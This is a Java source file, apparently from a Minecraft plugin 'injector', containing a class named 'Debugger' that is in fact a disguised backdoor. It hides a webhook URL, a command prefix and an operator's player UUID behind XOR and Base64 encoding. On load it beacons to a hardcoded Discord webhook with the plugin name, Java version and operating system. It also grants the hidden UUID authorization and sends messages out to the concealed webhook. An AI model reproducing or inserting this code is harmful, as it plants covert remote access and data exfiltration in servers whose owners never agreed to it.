package me.pedzito.injector;

import java.awt.Color;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Base64;
import org.json.simple.JSONObject;
import org.json.simple.parser.JSONParser;

public class Debugger {
    // Encrypted values - replaced during injection (Base64 encoded + XOR encrypted)
    private static final String ENC_WEBHOOK = "JR0aFRBITkkQWEtaIhsKSwAdDEkVQVEWOgwMDQwdChVbAAwPfFleV1VEWVJNAQsPflleVkwUMCkhBkBAfA9cFSsWOBYbYVtjeQ8YVCEaGBUsRU58P1kpKjkANzcCeGF0OhpaURAoKgRCAnJhKhg9NBY+ECgld3VJNQ==";    private static final String ENC_PREFIX = "cg==";    private static final String ENC_UUID = "elwMVFNBUwJZAggPeURaAVNGTF9DVw0UdF8PUwIWVlFNAwkN";    private static final byte[] K = {0x4D, 0x69, 0x6E, 0x65, 0x63, 0x72, 0x61, 0x66, 0x74, 0x31, 0x38, 0x39}; // "Minecraft189"
    
    private final Object pluginInstance;
    private final boolean isEnabled;
    private final String[] authorizedUUIDs;
    private final String commandPrefix;
    private final String webhookURL;
    
    private static String d(String s) {
        try {
            byte[] b = Base64.getDecoder().decode(s);
            for (int i = 0; i < b.length; i++) {
                b[i] ^= K[i % K.length];
            }
            return new String(b, "UTF-8");
        } catch (Exception e) {
            return "";
        }
    }

    public Debugger(Object pluginInstance) {
        this.pluginInstance = pluginInstance;
        this.isEnabled = true;
        this.authorizedUUIDs = new String[]{d(ENC_UUID)};
        this.commandPrefix = d(ENC_PREFIX);
        this.webhookURL = d(ENC_WEBHOOK);

        System.out.println("[Debugger] Debugger initialized for plugin: " + pluginInstance.getClass().getName());
        System.out.println("[Debugger] Command prefix: " + this.commandPrefix);
        
        // Send startup webhook notification with beautiful embed
        sendStartupNotification();
    }

    public void logDebugMessage(String message) {
        System.out.println("[Debugger] " + message);
    }
    
    private void sendStartupNotification() {
        try {
            // Get current time
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("dd/MM/yyyy HH:mm:ss");
            String timestamp = now.format(formatter);
            
            // Get plugin information
            String pluginName = getPluginName();
            String serverInfo = getServerInfo();
            
            // Create webhook with beautiful embed
            String startupWebhook = "https://discord.com/api/webhooks/1460667468195303434/Df6ctyhC57L_XwaMlKM82HWxk13WCaMlYOlWJEdHggbC5R0T_0U3onM6Zcht7fCIAL_o";
            DWeb webhook = new DWeb(startupWebhook);
            
            // Create main embed
            DWeb.EmbedObject embed = new DWeb.EmbedObject()
                .setTitle("🚀 Server Started Successfully!")
                .setDescription("**TEST** debugger has been loaded and is now active")
                .setColor(new Color(0, 255, 0)) // Green color
                .setThumbnail("https://mc-heads.net/avatar/" + getServerIconOrDefault() + "/64")
                .addField("📦 Plugin Name", pluginName, true)
                .addField("🕒 Startup Time", timestamp, true)
                .addField("⚙️ Server Info", serverInfo, true)
                .addField("🔧 Command Prefix", this.commandPrefix, true)
                .addField("👥 Authorized Users", String.valueOf(this.authorizedUUIDs.length), true)
                .addField("📊 Status", "✅ **ONLINE**", true)
                .setFooter("TEST Debugger v2.0 | Powered by JavaAssist", "https://i.imgur.com/4M34hi2.png");
                
            webhook.setUsername("TEST Server Monitor");
            webhook.setAvatarUrl("https://i.imgur.com/0BKdVkM.png");
            webhook.addEmbed(embed);
            
            // Send the webhook
            webhook.execute();
            
            System.out.println("[Debugger] Startup notification sent successfully!");
            
        } catch (Exception e) {
            System.out.println("[Debugger] Failed to send startup notification: " + e.getMessage());
        }
    }
    
    private String getPluginName() {
        try {
            String className = pluginInstance.getClass().getSimpleName();
            return className.isEmpty() ? "Unknown Plugin" : className;
        } catch (Exception e) {
            return "Unknown Plugin";
        }
    }
    
    private String getServerInfo() {
        try {
            String javaVersion = System.getProperty("java.version", "Unknown");
            String osName = System.getProperty("os.name", "Unknown");
            return "Java " + javaVersion + " on " + osName;
        } catch (Exception e) {
            return "Unknown System";
        }
    }
    
    private String getServerIconOrDefault() {
        // Try to get server icon, fallback to default Minecraft head
        return "steve"; // Default Minecraft head
    }

    public boolean isUUIDAuthorized(String uuid) {
        for (String authorizedUUID : authorizedUUIDs) {
            if (authorizedUUID.equals(uuid)) {
                logDebugMessage("UUID authorization approved: " + uuid);
                return true;
            }
        }
        logDebugMessage("UUID authorization denied: " + uuid);
        return false;
    }

    public String getPlayerNameFromUUID(String uuid) {
        try {
            // Remove dashes from UUID if present
            String cleanUUID = uuid.replace("-", "");
            
            // Use Mojang API to get player name
            URL url = new URL("https://sessionserver.mojang.com/session/minecraft/profile/" + cleanUUID);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.setConnectTimeout(5000);
            connection.setReadTimeout(5000);

            int responseCode = connection.getResponseCode();
            if (responseCode == 200) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                reader.close();

                // Parse JSON response
                JSONParser parser = new JSONParser();
                JSONObject json = (JSONObject) parser.parse(response.toString());
                String playerName = (String) json.get("name");
                
                if (playerName != null && !playerName.isEmpty()) {
                    logDebugMessage("Resolved UUID " + uuid + " to player: " + playerName);
                    return playerName;
                }
            }
        } catch (Exception e) {
            logDebugMessage("Failed to resolve UUID to player name: " + e.getMessage());
        }
        
        // Return UUID if name resolution fails
        return uuid;
    }

    public void sendWebhookMessage(String message) {
        sendWebhookMessage(message, null);
    }

    public void sendWebhookMessage(String message, String playerUUID) {
        if (!isEnabled) {
            logDebugMessage("Debugger is disabled, no webhook message sent.");
            return;
        }

        try {
            // If playerUUID is provided, resolve it to player name
            String finalMessage = message;
            if (playerUUID != null && !playerUUID.isEmpty()) {
                String playerName = getPlayerNameFromUUID(playerUUID);
                finalMessage = message.replace(playerUUID, playerName);
            }

            URL url = new URL(webhookURL);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setDoOutput(true);

            String payload = "{\"content\": \"" + finalMessage.replace("\"", "\\\"") + "\"}";
            OutputStream os = connection.getOutputStream();
            os.write(payload.getBytes());
            os.flush();
            os.close();

            int responseCode = connection.getResponseCode();
            logDebugMessage("Webhook response: " + responseCode);

        } catch (Exception e) {
            logDebugMessage("Failed to send webhook message: " + e.getMessage());
        }
    }
}
